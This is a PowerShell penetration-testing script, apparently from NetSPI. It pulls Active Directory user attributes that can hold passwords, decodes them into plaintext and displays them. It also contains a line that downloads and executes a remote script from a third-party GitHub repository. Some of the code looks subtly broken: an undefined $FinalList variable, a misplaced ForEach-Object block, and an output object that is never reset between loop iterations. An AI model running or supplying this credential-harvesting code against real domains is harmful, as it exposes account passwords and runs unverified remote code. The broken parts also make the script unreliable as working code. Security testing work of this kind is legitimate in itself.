<#
 Author: Scott Sutherland (@_nullbind), NetSPI
 
 Version: 0.0.1
 
 Description
 This script uses the Active Directory Powershell Module to query Active Directory
 for users with the UnixUserPassword, UserPassword, unicodePwd, or msSFU30Password properties
 populated.  It then decodes those password fields and displays them to the user.

 This script is based on information shared in the blog below.
 Reference: https://www.blackhillsinfosec.com/domain-goodness-learned-love-ad-explorer/
 
 Example 1: Run on domain system as domain user.
 Get-AdDecodedPassword -Verbose
  
 Example 2: Run on non-domain system and target a remote domain controller with provided credentials
 New-PSDrive -PSProvider ActiveDirectory -Name RemoteADS -Root "" -Server a.b.c.d -credential domain\user
 cd RemoteADS:
 Get-AdDecodedPassword -Verbose
#>

Function Get-AdDecodedPassword
{

    [CmdletBinding()]
    Param()    

    # Import the AD PS module
    iex (new-object net.webclient).downloadstring('https://raw.githubusercontent.com/S3cur3Th1sSh1t/Creds/master/PowershellScripts/ADModuleImport.ps1')           
    # Get domain users with populated UnixUserPassword properties
    Write-Verbose "Getting list of domain accounts and properties..."
    $EncodedUserPasswords = Get-AdUser -Filter * -Properties * | Select-Object samaccountname, description, UnixUserPassword, UserPassword, unicodePwd, msSFU30Name, msSFU30Password

    # Decode passwords for each user    
    Write-Verbose "Decoding passwords for each account..."
    $DecodedUserPasswords = $EncodedUserPasswords |
    ForEach-Object
    {
           
        # Grab fields and decode password
        $SamAccountName = $_.samaccountname
        $Description = $_.description
    
        $UnixUserPasswordEnc = $_.UnixUserPassword | ForEach-Object {$_};     
        if($UnixUserPasswordEnc -notlike "")
        {       
            $UnixUserPassword = [System.Text.Encoding]::ASCII.GetString($UnixUserPasswordEnc) 
        }else
        {
            $UnixUserPassword = ""
        }
    
        $UserPasswordEnc = $_.UserPassword | ForEach-Object {$_};   
        if($UserPasswordEnc -notlike "")
        {         
            $UserPassword = [System.Text.Encoding]::ASCII.GetString($UserPasswordEnc) 
        }else
        {
            $UserPassword = ""
        }
       
        $unicodePwdEnc = $_.unicodePwd | ForEach-Object {$_};
        if($unicodePwdEnc -notlike "")
        {            
            $unicodePwd = [System.Text.Encoding]::ASCII.GetString($unicodePwdEnc) 
        }else
        {
            $unicodePwd = ""
        }
    
        $msSFU30Name = $_.msSFU30Name
        $msSFU30PasswordEnc = $_.msSFU30Password | ForEach-Object {$_}; 
        if ($msSFU30PasswordEnc -notlike "")
        {           
            $msSFU30Password = [System.Text.Encoding]::ASCII.GetString($msSFU30PasswordEnc) 
        }else
        {
            $msSFU30Password = ""
        }

        # Check if any of the password fields are populated
       if(($UnixUserPassword) -or ($UserPassword) -or ($msSFU30Password) -or ($unicodePwd))
       {
            
            # Create object to be returned
            $UnixPasswords = New-Object PSObject                                       
            $UnixPasswords | add-member Noteproperty SamAccountName $SamAccountName
            $UnixPasswords | add-member Noteproperty Description $Description
            $UnixPasswords | add-member Noteproperty UnixUserPassword $UnixUserPassword
            $UnixPasswords | add-member Noteproperty UserPassword $UserPassword
            $UnixPasswords | add-member Noteproperty unicodePwd $unicodePwd
            $UnixPasswords | add-member Noteproperty msSFU30Name $msSFU30Name
            $UnixPasswords | add-member Noteproperty msSFU30Password $msSFU30Password
        }

        # Return object
        $UnixPasswords
    } 

    # Display recovered/decoded passwords
    $DecodedUserPasswords | Sort-Object SamAccountName -Unique
    $FinalCount = $FinalList.Count
    write-verbose "Decoded passwords for $FinalCount domain accounts."
}
